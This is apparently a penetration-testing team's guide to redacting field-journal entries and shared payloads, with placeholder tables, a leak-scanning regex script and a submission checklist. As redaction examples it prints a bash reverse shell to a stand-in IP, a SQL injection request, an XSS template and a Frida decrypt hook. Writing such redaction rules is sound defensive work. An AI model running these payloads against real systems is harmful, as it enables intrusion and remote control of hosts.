# Field-Journal Redaction Specification

> Writing field-journal entries, submitting PRs, sharing payloads and sending reports externally **require redaction**. The placeholder specification below borrows from the anonymization protocol of the PentAGI multi-agent system, with the goal of **keeping the reusable value without exposing real targets**.

## Placeholder table

### Network and hosts

| Type | Placeholder | Applies to |
|------|-------|---------|
| Target IP | `{target_ip}` | Penetration target host |
| Victim IP | `{victim_ip}` | Next hop in intranet lateral movement |
| Remote host | `{remote_host}` | Generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse connections |
| Target domain | `{target_domain}` | Web / mail targets |
| Victim domain | `{victim_domain}` | Intranet domain |
| Custom port | `{port}` | Non-standard ports |
| Standard port | Keep the original value | 80 / 443 / 22 / 445 / 3389 and so on stay, for reuse |

### Credentials and keys

| Type | Placeholder |
|------|-------|
| Username | `{username}` |
| Password | `{password}` |
| Hash | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and endpoints

| Type | Placeholder |
|------|-------|
| Generic URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload point | `{upload_endpoint}` |
| Login interface | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------|
| Install directory | `{install_dir}` |
| Configuration file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business identifiers

| Type | Placeholder |
|------|-------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order number | `{order_id}` |
| UUID | `{uuid}` |

## What not to redact

To keep the experience reusable, **do not replace** the following:

- CVE numbers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 and so on)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Context preservation principle

When replacing, **keep the semantic structure** so others still know what it is:

```python
# Wrong: everything replaced with X, the meaning is lost
target = "X"
url = "X/X"

# Wrong: replacement too generic
target = "{target}"
url = "{url}"

# Right: context preserved
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload redaction

### Web payload

```
Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

Redacted: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# redacted
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook scripts

```javascript
// original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// redacted
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Redacting binary samples

### Hashes

Recording the sha256 is enough; **do not attach the original file**. If the sample must be shared:

- Upload it to a public sample repository such as VirusTotal or MalwareBazaar
- Link to a sample with the same hash that others have already analyzed

### Strings and symbols

```c
// original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// redacted
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Redacting screenshots

- Cover with mosaic or solid black: usernames, emails, phone numbers, order numbers, names
- Show only the domain structure in the URL bar (keep the path, cover the host), or replace it entirely
- Keep the first two octets of intranet IP ranges: `10.0.x.x` rather than `10.0.10.50`
- Image elements that identify the company (logos / watermarks) must be covered

## Special case: CTF scenarios

CTF challenge statements, target machine hostnames and flag formats are **usually not sensitive** (the target machines are public challenges), but:

- Treat self-hosted private ranges as real environments
- Flags must not be published before the competition ends
- Do not copy others' unpublished solutions directly into the field-journal

## Automatic detection script

After writing a field-journal entry, run the regexes below to find missed redactions:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# mainland China mobile numbers
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

Packaged as `skills/scripts/scan-leaks.ps1` (PowerShell, compatible with PS 5.1 / pwsh); run it before every commit:
```powershell
powershell -File skills/scripts/scan-leaks.ps1 -Path skills/field-journal
```
CI (the ci.yml `leak-scan` job) runs this script and fails directly when it finds unredacted information.

## The reverse: reading others' redacted documents

When reading others' field-journal entries / writeups, if you meet placeholders such as `{target_ip}`, **do not replace them with real values from your own environment and commit**; just keep the placeholders unchanged.

## Field-Journal must-check items

Check this checklist before submitting a field-journal entry:

```
□ No public IPs (except CDNs / public services)
□ No real domains (except demo domains such as example.com)
□ No real credentials / tokens / hashes (replaced with {placeholder})
□ No names / employee IDs / emails leaking in screenshots
□ No sample file itself (only the sha256)
□ JWT / OAuth codes / API keys all replaced
□ Intranet IP ranges blurred to the first two octets (10.0.x.x)
□ Target parameters in payloads replaced with generic placeholders
□ Cookies and session ids replaced
```

Add this checklist directly to the end of `field-journal/_template.md`.
